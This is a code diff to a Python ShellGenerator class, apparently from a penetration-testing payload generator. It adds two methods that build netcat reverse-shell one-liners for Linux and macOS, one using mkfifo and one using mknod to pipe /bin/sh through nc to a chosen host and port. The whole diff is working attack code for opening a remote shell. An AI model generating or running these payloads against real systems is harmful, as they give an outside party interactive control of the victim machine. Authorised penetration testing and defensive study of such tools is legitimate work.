@@ -253,6 +253,45 @@ class ShellGenerator:
                                                                                                               str(Error))
         return self.__status
 
+    def nc_mkfifo_sh(self):
+        """
+            Description: This payload support GNU/Linux and Mac OSX
+        """
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
+                self.validate_parameter_type_reverse()['code'] == 200:
+            try:
+                self.__payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(
+                    self.__target, self.__port)
+                self.__status['code'] = 200
+                self.__status['message'] = self.__payload
+            except Exception as Error:
+                self.__status['code'] = 500
+                self.__status['message'] = self.__status['message'] if len(
+                    self.__status['message']) != 0 else color.color(
+                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
+                                                                                                              str(Error))
+        return self.__status
+
+    def nc_mknod_sh(self):
+        """
+            Description: This payload support GNU/Linux and Mac OSX
+        """
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
+                self.validate_parameter_type_reverse()['code'] == 200:
+            try:
+                self.__payload = "rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(
+                    self.__target, self.__port)
+                self.__status['code'] = 200
+                self.__status['message'] = self.__payload
+            except Exception as Error:
+                self.__status['code'] = 500
+                self.__status['message'] = self.__status['message'] if len(
+                    self.__status['message']) != 0 else color.color(
+                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
+                                                                                                              str(Error))
+        return self.__status
     def nc_e(self):
         """
             Description: This payload support GNU/Linux and Mac OSX
